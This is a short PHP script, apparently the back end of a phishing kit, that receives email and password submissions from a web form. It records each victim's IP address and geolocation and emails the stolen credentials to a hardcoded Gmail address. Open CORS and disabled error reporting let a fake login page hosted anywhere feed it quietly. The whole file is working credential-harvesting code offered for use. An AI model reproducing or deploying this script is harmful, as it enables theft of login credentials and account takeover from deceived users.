<?php
<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

error_reporting(0);

// --- EMAIL CONFIGURATION ---
$to = "jc4717287@gmail.com"; // <-- Replace with your email address
$subject = "New Submission from fire.php";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = htmlspecialchars(strip_tags($_POST['password']));

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo json_encode(["status" => "error", "message" => "Invalid email"]);
        exit;
    }

    // Get IP address
    $ip = $_SERVER['REMOTE_ADDR'];

    // Geolocation via GeoPlugin
    $geo = @json_decode(@file_get_contents("http://www.geoplugin.net/json.gp?ip={$ip}"));
    $location = "Unknown";
    if ($geo && $geo->geoplugin_countryName) {
        $location = "{$geo->geoplugin_city}, {$geo->geoplugin_region}, {$geo->geoplugin_countryName}";
    }

    // --- EMAIL BODY ---
    $body = "Email: $email\n";
    $body .= "Password: $password\n";
    $body .= "IP Address: $ip\n";
    $body .= "Location: $location\n";
    $headers = "From: $email";

    // Send email
    $mailSent = mail($to, $subject, $body, $headers);

    if ($mailSent) {
        echo json_encode(["status" => "success", "message" => "Information sent to your email"]);
    } else {
        echo json_encode(["status" => "error", "message" => "Failed to send email"]);
    }
} else {
    echo json_encode(["status" => "error", "message" => "Invalid request"]);
}
?>